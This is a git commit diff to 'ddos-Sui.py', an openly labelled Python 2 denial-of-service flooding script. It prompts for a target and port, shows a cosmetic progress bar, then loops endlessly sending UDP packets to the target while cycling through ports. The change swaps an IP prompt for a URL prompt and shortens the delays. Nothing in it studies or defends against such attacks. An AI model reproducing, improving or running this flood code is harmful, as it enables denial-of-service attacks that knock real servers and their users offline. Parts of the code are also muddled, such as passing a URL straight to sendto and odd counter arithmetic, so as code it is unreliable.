37eff049bb48a05bbdb25b0b2bea4bf1e421d322
hasan08122020108181818 <108554860+hasan08122020108181818@users.noreply.github.com>
2023-08-31 15:58:27 +0300

    Update ddos-Sui.py

--- ddos-Sui.py
+++ ddos-Sui.py
@@ -31,32 +31,32 @@ print ('''
                                \033[92m[\033[91mPowered By : Ronaldo\033[92m]
                                \033[93m[\033[94m127.0.0.1\033[93m]\033[95m|_|\033[93m[\033[94m127.217.21.78\033[93m]                                                                         
 ''')
-ip = raw_input("IP Target : ")
+url = raw_input("url : ")
 port = input("Port       : ")
 
 os.system("clear")
 print "\033[91mMission Start DDOS"
 print "\033[91m[                    ] 0% "
-time.sleep(5)
-print "\033[92m[=====               ] 25%"
-time.sleep(5)
-print "\033[92m[==========          ] 50%"
-time.sleep(5)
-print "\033[92m[===============     ] 75%"
-time.sleep(5)
-print "\033[92m[====================] 100%"
 time.sleep(3)
+print "\033[92m[=====               ] 25%"
+time.sleep(3)
+print "\033[92m[==========          ] 50%"
+time.sleep(3)
+print "\033[92m[===============     ] 75%"
+time.sleep(3)
+print "\033[92m[====================] 100%"
+time.sleep(2)
 os.system ("clear")
-sent = 0
+sent = 7
 while True:
      while 1:
         if time.time() > timeout:
             break
         else:
             pass
-     sock.sendto(bytes, (ip,port))
+     sock.sendto(bytes, (url,port))
      sent = sent + 70
      port = port + 70
-     print "\033[92mSent %s packet to %s throught port:%s successful"%(sent,ip,port)
+     print "\033[92mSent %s packet to %s throught port:%s successful"%(sent,url,port)
      if port == 65534:
        port = 20
